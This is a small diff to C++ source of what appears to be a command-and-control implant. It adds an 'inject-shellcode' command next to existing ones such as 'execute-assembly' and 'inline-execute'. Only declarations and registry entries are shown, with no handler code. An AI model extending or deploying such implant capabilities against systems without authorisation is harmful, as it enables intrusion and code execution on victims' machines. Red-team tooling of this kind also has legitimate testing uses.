@@ -16,6 +16,7 @@ BOOL CommandExecuteAssembly(json& args, string artifact, json& result);
 BOOL CommandJobList(json& args, string artifact, json& result);
 BOOL CommandJobStop(json& args, string artifact, json& result);
 BOOL CommandInlineExecute(json& args, string artifact, json& result);
+BOOL CommandInjectShellcode(json& args, string artifact, json& result);
 
 std::vector<ImplantCommand> g_CommandRegistry = {
   {"exit",                 CommandExit            },
@@ -32,5 +33,6 @@ std::vector<ImplantCommand> g_CommandRegistry = {
   {"execute-assembly",     CommandExecuteAssembly },
   {"job.list",             CommandJobList         },
   {"job.stop",             CommandJobStop         },
-  {"inline-execute",       CommandInlineExecute   }
+  {"inline-execute",       CommandInlineExecute   },
+  {"inject-shellcode",     CommandInjectShellcode }
 };
